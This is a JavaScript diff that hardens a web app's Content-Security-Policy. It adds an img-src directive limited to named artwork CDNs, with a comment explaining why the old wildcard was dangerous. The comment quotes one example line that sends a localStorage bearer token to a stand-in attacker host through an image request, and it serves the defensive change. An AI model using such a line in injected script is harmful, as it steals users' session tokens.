@@ -20,6 +20,7 @@ const DEFAULT_ADDON_BASE = "http://localhost:7001";
 
 const CONNECT_SRC_PLACEHOLDER = "__CONNECT_SRC__";
 const SCRIPT_SRC_PLACEHOLDER = "__SCRIPT_SRC__";
+const IMG_SRC_PLACEHOLDER = "__IMG_SRC__";
 
 const originOf = (value) => {
   if (typeof value !== "string" || !value.trim()) return null;
@@ -76,6 +77,28 @@ export const buildConnectSrc = ({ apiBase, addonBase, sentryDsn, extra } = {}) =
   return sources.join(" ");
 };
 
+/**
+ * Builds `img-src`.
+ *
+ * The value this replaced was `'self' data: https:`, which is a wildcard over
+ * every host on the web — and an <img> is a request, so it exfiltrates just as
+ * well as a fetch does:
+ *
+ *     new Image().src = "https://attacker.example/?t=" + localStorage.cataloggy_token;
+ *
+ * The bearer token lives in localStorage by design, and `connect-src` was
+ * tightened precisely so injected script could not post it anywhere. Leaving
+ * `img-src` open left that door on the latch.
+ *
+ * Every picture the app renders — posters, backdrops, provider logos, cast
+ * photos, game covers — comes from one of the four artwork CDNs, so naming them
+ * costs nothing. `data:` stays for the inline placeholders; `'self'` for the
+ * icons and the logo shipped with the build.
+ *
+ * @returns {string} the `img-src` value
+ */
+export const buildImgSrc = () => ["'self'", "data:", ...IMAGE_CDN_ORIGINS].join(" ");
+
 // Comment or inline script, whichever comes first, in one left-to-right pass.
 //
 // The alternation is what keeps the two apart. index.html explains in prose why
@@ -130,20 +153,29 @@ export const buildScriptSrc = (html) => {
 /**
  * Substitutes the rendered directives into the serve.json template.
  *
+ * `img-src` takes no argument because nothing about it varies per container —
+ * it is rendered here rather than written into the template so that it can be
+ * built from the one list of artwork CDNs instead of a second copy that drifts.
+ *
  * @param {string} template raw contents of serve.template.json
  * @param {string} connectSrc value returned by `buildConnectSrc`
  * @param {string} [scriptSrc] value returned by `buildScriptSrc`
  * @returns {string} serve.json contents
  */
 export const renderServeConfig = (template, connectSrc, scriptSrc = "'self'") => {
-  for (const placeholder of [CONNECT_SRC_PLACEHOLDER, SCRIPT_SRC_PLACEHOLDER]) {
+  for (const placeholder of [
+    CONNECT_SRC_PLACEHOLDER,
+    SCRIPT_SRC_PLACEHOLDER,
+    IMG_SRC_PLACEHOLDER,
+  ]) {
     if (!template.includes(placeholder)) {
       throw new Error(`serve.json template is missing the ${placeholder} placeholder`);
     }
   }
   const rendered = template
     .replaceAll(CONNECT_SRC_PLACEHOLDER, connectSrc)
-    .replaceAll(SCRIPT_SRC_PLACEHOLDER, scriptSrc);
+    .replaceAll(SCRIPT_SRC_PLACEHOLDER, scriptSrc)
+    .replaceAll(IMG_SRC_PLACEHOLDER, buildImgSrc());
   // Fail here rather than serving a file `serve` would refuse to parse.
   JSON.parse(rendered);
   return rendered;
